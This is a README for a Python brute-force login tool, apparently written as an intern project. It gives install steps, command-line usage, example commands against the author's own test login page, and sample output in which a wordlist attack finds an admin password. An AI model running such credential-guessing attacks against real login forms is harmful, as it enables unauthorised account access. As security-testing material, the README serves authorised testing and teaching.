# Brute Force Login Tool

![Python Version](https://img.shields.io/badge/Python-3.x-blue) ![License](https://img.shields.io/badge/license-MIT-green)

## Overview

This is a simple Brute Force Login tool written in Python. It is designed to assist in testing the security of login forms or API login endpoints. The tool supports both GET and POST methods for brute force attacks.

## Features

*   **Form Analysis:** Extracts and analyzes HTML form attributes to identify input names for username and password fields, extracts the `type` of a input tag or button tag, also extracts all the required tokens, cookies for a login Session.
*   **Wordlist Attack:** Supports username and password brute force attacks using a provided wordlist file.
*   **GET and POST Methods:** Choose between GET and POST methods based on the target's login mechanism.
*   **Cookie Support:** Optionally provide a cookie value for authentication.
*   **User-friendly Interface:** Provides clear and colored console output for better user interaction.


## Release - PYPI
```
pip install pip install brute-force-attacker
```


### How to Run as command line tool

```
brute -w <wordlist_file> -t <target_url> -m <http_method> [-u <username>] [-c <cookie_value>]
```

*   `-t` or `--target`: Specify the target URL.
*   `-w` or `--wordlist`: Specify the wordlist file.
*   `-m` or `--method`: Specify the HTTP method (get or post).

Optional arguments:

*   `-u` or `--username`: Specify the username for targeted brute force (optional).
*   `-c` or `--cookie`: Specify the cookie value for authentication (optional).

## Usage

### Installation from git repository

```
git clone https://github.com/Praveenms13/Cappricio-Intern-Task.git
```

```
cd Cappricio-Intern-Task
```

### Create a Virtual Environment 
```
python3 -m venv venv
```
### Activate 
```
source venv/bin/activate
```
### Download Necessary packages
```
pip install -r brute/requirements.txt 
```

### How to Run

```
python3 brute.py -w <wordlist_file> -t <target_url> -m <http_method> [-u <username>] [-c <cookie_value>]
```

*   `-t` or `--target`: Specify the target URL.
*   `-w` or `--wordlist`: Specify the wordlist file.
*   `-m` or `--method`: Specify the HTTP method (get or post).

Optional arguments:

*   `-u` or `--username`: Specify the username for targeted brute force (optional).
*   `-c` or `--cookie`: Specify the cookie value for authentication (optional).

## Examples

### Brute Force Login using POST with username
#### Here admin is the username, word1.txt contains all the common passwords (Passwords only)
```
python3 brute.py -w word1.txt -u admin -t "https://forms.praveenms.site/login.php" -m POST
```
### Brute Force Login using POST without username
#### By the below syntax you can run the brute force attack without usernames as it takes all the common username and password from the file named word2.txt
```
python3 brute.py -w word2.txt -t "https://forms.praveenms.site/login.php" -m POST
```

### Brute Force Login using GET with Username
#### This works on HTTP Get method with username where the username is given and the password is left Blank where it is extracted from the word1.txt
```
python3 brute.py -w word1.txt -t "https://forms.praveenms.site/login.php?username=admin&password=" -m GET
```

### Brute Force Login using GET with Username
#### This works on HTTP Get method without username and password where the username and password is left Blank, it is extracted from the word2.txt
```
python3 brute.py -w word1.txt -t "https://forms.praveenms.site/login.php?username=&password=" -m GET
```

## Sample usage
```
➜  Praveen brute-force git:(main U:1 ✗) 🚀 brute -w word1.txt -u admin -t "https://forms.praveenms.site/login.php" -m POST
Brute Force Login
Tool By Praveen
Required Login Page URL or API Login URL Endpoint
Leave blank if you don't have, In optional cases
This module is not intended to be imported
[+] Username Provided, Username: admin, Using Username From User Input
[+] Using POST Method

Form Attributes Found:

Form 1 attributes:
  Method: POST
  Action: login.php
  Input types:
    password, text
  Input names:
    username, password
  Input names for username and password fields:
    Username input name: username
    Password input name: password
[+] Using Wordlist: /home/mspraveenkumar77/htdocs/brute-force/word1.txt
-----------------------------------------------
Trying: admin and root ...
[+] Status Code: 401
-----------------------------------------------
Trying: admin and admin ...
[+] Status Code: 401
-----------------------------------------------
Trying: admin and test ...
[+] Status Code: 401
-----------------------------------------------
Trying: admin and guest ...
[+] Status Code: 401
-----------------------------------------------
Trying: admin and ansible ...
[+] Status Code: 401
-----------------------------------------------
Trying: admin and ec2-user ...
[+] Status Code: 401
-----------------------------------------------
Trying: admin and vagrant ...
[+] Status Code: 401
-----------------------------------------------
Trying: admin and azureuser ...
[+] Status Code: 401
-----------------------------------------------
Trying: admin and !root ...
[+] Status Code: 401
-----------------------------------------------
Trying: admin and pass@123 ...
[+] Status Code: 200
[+] Login Successful!
[+] Login Creds: 
[+] Username: admin
[+] password: pass@123
```

## Disclaimer

This tool is intended for educational and testing purposes only. Unauthorized access to systems or networks without permission is illegal.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.